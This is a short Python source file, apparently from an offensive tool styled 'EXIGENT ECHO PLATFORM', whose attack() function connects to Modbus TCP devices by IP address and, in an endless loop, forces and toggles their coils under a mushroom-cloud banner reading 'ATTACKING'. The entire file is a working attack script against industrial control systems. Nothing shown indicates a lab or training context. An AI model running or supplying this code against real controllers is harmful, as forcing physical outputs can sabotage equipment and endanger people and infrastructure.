from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from time import sleep
from datetime import datetime
import os


def attack(attack_data):
    start = datetime.now()
    while True:
        os.system('clear')
        try:
            print(" EXIGENT ECHO PLATFORM v.1  ")
            print("     _.-^^---....,,--       ")
            print(" _--                  --_   ")
            print("<                        >) ")
            print("|                         | ")
            print(" \._                   _./  ")
            print("    ```--. . , ; .--'''     ")  
            print("          | |   |           ")
            print("       .-=||  | |=-.        ")
            print("       `-=#$%&%$#=-'        ")
            print("          | ;  :|           ")
            print(" _____.,-#%&$@%#&#~,.______ ")
            print("=====ATTACKING=====")
            print("Attack Duration - {}".format((datetime.now() - start)))
            print("Targets:")
            for k,v in attack_data.items():
                #client = ModbusClient(k)
                #print("IP address - {} ".format(k))
                print(k)
            for k,v in attack_data.items():
                client = ModbusClient(k)
                for x, e in v['coils'].items():
                    if e[1].lower() == "y":
                        client.write_coil(int(x), True)
                        sleep(1)
                        client.write_coil(int(x), False)
                    if e[0].lower() == "true":
                        #print(x,True)
                        result = client.write_coil(int(x), True)
                    elif e[0].lower() == "false":
                        #print(x, False)
                        result = client.write_coil(int(x), False)
                    #result = client.write_coils(x, e)
        except KeyboardInterrupt:
            print("Cancelling Attack")
            return

